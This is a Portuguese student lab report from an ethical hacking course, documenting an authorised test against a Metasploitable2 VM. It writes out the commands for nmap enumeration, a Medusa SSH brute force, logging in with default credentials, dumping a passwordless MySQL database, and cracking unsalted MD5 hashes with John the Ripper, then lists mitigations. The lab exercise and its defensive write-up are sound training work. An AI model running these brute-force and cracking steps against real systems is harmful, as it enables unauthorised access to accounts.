# Documentação Técnica — Nmap, Medusa e John The Ripper
**Curso / Disciplina:** Santander Cyber Segurança DIO 2025 — Ethical Hacking (ambiente laboratorial).  
**Autor:** Raphael Cordeiro Cavalcanti de Albuquerque  
**Data:** 24 de outubro de 2025  
**Alvo:** VM Metasploitable2 — IP: `192.168.56.102`  
**Rede:** Host Only  
**Teste autorizado por:** Instrutora Isadora Ferrão

---

## 1. Objetivo
Demonstrar, em ambiente laboratorial autorizado, o processo de reconhecimento (network mapping) e exploração de credenciais fracas através das ferramentas: `nmap`, `medusa` e `John The Ripper`.  
O foco é identificar vulnerabilidades, comprovar a exploração e propor medidas de mitigação.

>**Aviso ético:** Todos os testes foram realizados em ambiente controlado e autorizado. É estritamente proibida a execução desses comandos em sistemas de produção ou sem permissão formal.

---

## 2. Escopo
- Host alvo: `192.168.56.102` (Metasploitable2).  
- Testes realizados:
  - Teste de conectividade (`ping`).  
  - Enumeração de portas e serviços (`nmap`).  
  - Ataque de força-bruta controlado (`medusa`).  
  - Quebra de hashes (`John The Ripper`).  
- Exclusões: nenhum sistema externo foi testado.

---

## 3. Ambiente de Teste e Ferramentas
- **Atacante:** Kali Linux Rolling 2025.3 x64  
- **Alvo:** Metasploitable2 (Ubuntu 64 bits)  
- **Rede:** Host Only  
- **Ferramentas e versões:**
  - Nmap — 7.95  
  - Medusa — 2.3  
  - John The Ripper — 1.9.0 Jumbo  
  - Git/GitHub — versionamento  
- **Autorização:** concedida pela instrutora *Isadora Ferrão*.

---

## 4. Resumo do fluxo de trabalho
1. Teste de conectividade entre as VMs.  
2. Enumeração de portas e serviços (Nmap).  
3. Ataque de força-bruta controlado (Medusa).  
4. Acesso SSH obtido com credenciais fracas.  
5. Acesso ao banco MySQL e extração de hashes MD5.  
6. Quebra de hashes via John The Ripper.  
7. Documentação das evidências e recomendações.

---

## 5. Procedimentos e comandos utilizados

### 5.1 Teste inicial de conectividade
```bash
ping -c 3 192.168.56.102

5.2 Enumeração com Nmap
nmap -sv -p 21,22,80,445,139 192.168.56.102

5.3 Criação das wordlists (usuários e senhas)
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

5.4 Ataque controlado com Medusa
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ssh -t 6 -O medusa_ssh_results.txt


Resultado: combinação válida — msfadmin:msfadmin.

5.5 Conexão SSH
ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@192.168.56.102
# senha: msfadmin

5.6 Acesso e enumeração MySQL
mysql -u root -p
show databases;
use dvwa;
show tables;
select * from users;


Observado: senhas armazenadas em MD5 sem salt.

5.7 Criação do arquivo de hashes
echo "5f4dcc3b5aa765d61d8327deb882cf99_e99a18c428cb38d5f260853678922e03_8d3533d75ae2c3966d7e0d4fcc69216b_0d107d09f5bbe40cade3de5c71e9e9b7_5f4dcc3b5aa765d61d8327deb882cf99" > /root/hashes/_db.txt
nano ~/hashes_dvwa.txt

5.8 Preparação da wordlist Rockyou
cd /usr/share/wordlists/
sudo gunzip rockyou.txt.gz

5.9 Quebra de hashes com John The Ripper
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt ~/hashes_dvwa.txt
john --show ~/hashes_dvwa.txt > john_show_results.txt

6. Evidências coletadas

nmap_services.txt

medusa_ssh_results.txt

hashes_dvwa.txt

john_show_results.txt

screenshots/ → capturas do terminal e do DVWA.

authorization.txt (documento da autorização da instrutora)

7. Resultados e achados principais

SSH com credenciais padrão: msfadmin:msfadmin

MySQL root sem senha: acesso total ao banco.

Senhas MD5 sem salt: facilmente quebradas.

Impacto: comprometimento completo do DVWA.

8. Vulnerabilidades identificadas

    Nº	    Vulnerabilidade	Descrição	                   Impacto

    1.	Credenciais padrão	SSH com usuário/senha fracos	 Alto

    2.	Root sem senha no MySQL	Acesso irrestrito ao banco	 Alto

    3.	Hashes MD5 sem salt	Quebra imediata de senhas	     Alto

    4.	Falta de proteção brute force	Nenhum bloqueio ou       rate-limit                                               Médio

9. Prova de Conceito (PoC)

Comando executado:

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt ~/hashes_dvwa.txt
john --show ~/hashes_dvwa.txt


Saída final (resumo real do teste):

admin:password
user1:abc123
user2:charley
user3:letmein
user4:password
# hashes_dvwa.txt: 5 password hashes cracked, 0 left


Evidências:

screenshots/8-cracked-hashes.PNG — saída do John.

screenshots/9-listado-5-senhas-crackeadas.PNG — Listagem do John.

screenshots/dvwa-credencial-01.PNG — login DVWA bem-sucedido.

screenshots/dvwa-credencial-02.PNG — login DVWA bem-sucedido.

screenshots/dvwa-credencial-03.PNG — login DVWA bem-sucedido.

screenshots/dvwa-credencial-04.PNG — login DVWA bem-sucedido.

screenshots/dvwa-credencial-05.PNG — login DVWA bem-sucedido.

A PoC demonstra a vulnerabilidade de armazenamento inseguro de senhas (MD5 sem salt), resultando em comprometimento total do DVWA.

10. Mitigações recomendadas

Trocar todas as credenciais padrão.

Configurar senha para root MySQL.

Migrar de MD5 para algoritmos modernos (bcrypt/Argon2).

Implementar fail2ban e bloqueio de tentativas múltiplas.

Isolar aplicações vulneráveis em ambiente de teste.

Aplicar MFA e políticas de senha forte.

11. Conclusão

A combinação de credenciais fracas, root sem senha e hashes MD5 sem salt possibilitou o acesso total ao sistema e a quebra de todas as senhas.
A PoC confirmou o login admin:password na aplicação DVWA, validando o comprometimento completo do ambiente.

Recomenda-se aplicar as medidas de mitigação e reforçar práticas de hardening.